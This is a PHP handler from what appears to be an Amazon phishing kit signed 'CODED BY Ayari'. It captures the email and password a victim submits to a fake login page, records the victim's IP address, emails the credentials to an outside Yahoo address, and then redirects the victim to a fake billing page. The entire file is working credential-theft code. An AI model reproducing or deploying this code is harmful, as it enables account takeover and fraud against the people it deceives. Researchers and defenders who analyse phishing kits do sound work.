<?
@$_SESSION['_email_'] = @$_POST['email'];
@$_SESSION['_password_'] = @$_POST['pass'];
$ip = getenv("REMOTE_ADDR");
$message .= "			<style type='text/css'>
			*{
				font-family: arial;
			}
			font{
				color: #4EC353;
			}
			</style>
			<div style='font-weight: 800;color: #FFFFFF;background: #C6AC00;font-size: 14px;border: 1px solid #06F;padding: 8px;border-radius: 5px 5px 0px 0px;font-size: 17px;'>Ayari | Amazon | LOG </div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<p>Email : <font>".@$_SESSION['_email_']."</font><p>
			<p>Password : <font>".@$_SESSION['_password_']."</font><p>
            <div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<p>IP : <font>".$ip."</font><p>
			</div>
			<div style='font-weight: 800;border: 1px solid #06F;padding: 8px;'>
			<center>CODED BY Ayari</center>
			</div>
			";
$hostname = gethostbyaddr($ip);
$headers  = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From:Ayari" . "\r\n";
$subject  = " Amazon Login -  [ " .$ip. " ] ";
$send = "logerloger@yahoo.com";
mail($send,$subject,$message,$headers);

header("Location: ../details.php?;5c55fd32f2523e_billing-center902698b4646a185");
?>